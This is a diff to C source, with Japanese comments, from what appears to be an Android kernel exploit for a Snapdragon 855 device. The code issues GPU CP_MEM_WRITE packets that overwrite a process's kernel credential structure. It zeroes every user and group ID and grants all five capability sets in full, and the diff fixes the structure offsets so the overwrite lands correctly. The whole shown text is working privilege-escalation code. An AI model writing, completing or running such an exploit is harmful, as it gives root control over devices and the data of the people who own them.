@@ -668,30 +668,37 @@ int main(int argc, char **argv) {
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
-            // ===== 修正: 正しいオフセット (cbase+0x0c から) で書き込む =====
-            // 書き込むデータ: 8 ID フィールド (0), securebits (0x00000004),
-            // CapInh, CapPrm, CapEff, CapBset, CapAmbient 各 0x00000003ffffffff
+            // ===== 修正: 正しいオフセットで書き込む (Snapdragon 855 レイアウト) =====
+            // オフセット 0x0c から 19 ワード (76バイト):
+            //   8 ワード: uid から fsgid まで (0x0c ~ 0x2b) → 0
+            //   1 ワード: securebits (0x2c) → 0x00000004
+            //  10 ワード: 5 つの Capability (各 2 ワード)
+            //       CapInh     (0x30 ~ 0x37)
+            //       CapPrm     (0x38 ~ 0x3f)
+            //       CapEff     (0x40 ~ 0x47)
+            //       CapBset    (0x48 ~ 0x4f)
+            //       CapAmbient (0x50 ~ 0x57)
             memset(ib_m, 0, 0x10000);
             dw = 0;
             split64(cbase + 0x0c, &zl, &zh);
-            cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);   // データ数 19 (8+1+5*2)
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);
             cmd[dw++] = zl; cmd[dw++] = zh;
 
-            // uid, gid, suid, sgid, euid, egid, fsuid, fsgid を 0
+            // 8 ワードの 0 (uid～fsgid)
             for (int i = 0; i < 8; i++) cmd[dw++] = 0;
 
-            // securebits (0x30) = 0x00000004
+            // securebits (0x2c)
             cmd[dw++] = 0x00000004;
 
-            // CapInh (0x34-0x38) = 0x00000003ffffffff
+            // CapInh (0x30-0x37) = 0x00000003ffffffff
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapPrm (0x3c-0x40)
+            // CapPrm (0x38-0x3f)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapEff (0x44-0x48)
+            // CapEff (0x40-0x47)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapBset (0x4c-0x50)
+            // CapBset (0x48-0x4f)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
-            // CapAmbient (0x54-0x58)
+            // CapAmbient (0x50-0x57)
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
 
             // Readback uid (cbase+0x0c)
